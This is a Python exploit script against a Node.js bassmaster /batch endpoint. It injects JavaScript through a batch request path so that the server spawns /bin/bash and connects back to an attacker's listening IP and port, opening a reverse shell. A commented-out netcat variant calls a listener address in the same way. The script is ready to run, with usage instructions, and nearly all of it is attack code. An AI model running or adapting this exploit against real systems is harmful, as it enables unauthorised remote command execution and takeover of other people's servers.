#!/usr/bin/env python3
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#
#  Author: Maximilian Marx

import requests
import sys

def main():
    if len(sys.argv) != 4:
        print("[*] Usage: %s <target ip> <listening ip> <listening port>" % sys.argv[0])
        print("[*] Example: %s 192.168.146.128 192.168.128.128 443"  % sys.argv[0])
        sys.exit(-1)
        
    target = "http://%s:8080/batch" % sys.argv[1]
    listening_ip = sys.argv[2]
    listening_port = sys.argv[3]

    # Example payload taken from internals.requestBatch
    # Payload consists of JSON with an array including three HTTP GET requests
    # See bassmaster's example/batch.js
    request_profile = '{"method": "get", "path":"/profile"}'
    request_item = '{"method": "get", "path":"/item"}'
    
    # Code taken from https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/
    nodejs_shell  = 'var net = require(\'net\'), sh = require(\'child_process\').exec(\'\\\\x2fbin\\\\x2fbash\'); '
    nodejs_shell += 'var client = new net.Socket(); '
    nodejs_shell += 'client.connect(%s, \'%s\', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);' % (listening_port, listening_ip)
    nodejs_shell += 'sh.stderr.pipe(client);});'

    # Another, simpler shell leveraging nc
    # Advantage of using this shell: We don't have to bother with hex encoding forwardslashes :)
    # Disadvantage: Vulnerable host has to have nc accessible/installed
    """
    nc_shell = "nc 192.168.128.128 443;"
    node_exec_nc = 'var net = require(\'net\'), sh = require(\'child_process\').exec(\'%s\'); ' % nc_shell
    """
    
    request_injection = '{"method": "get", "path":"/item/$1.id;%s"}' % nodejs_shell
    
    payload = '{"requests":[%s,%s,%s]}' % (request_profile, request_item, request_injection)

    print("[*] Sending payload...")
    try:
        r = requests.post(target, payload)

        r.raise_for_status()
    except Exception as err:
        print("[-] Something went wrong: %s" % err)
        print("[-] Is your listener up?")
    else:
        print("[+] Payload sent, check your listener.")

if(__name__ == "__main__"):
    main()
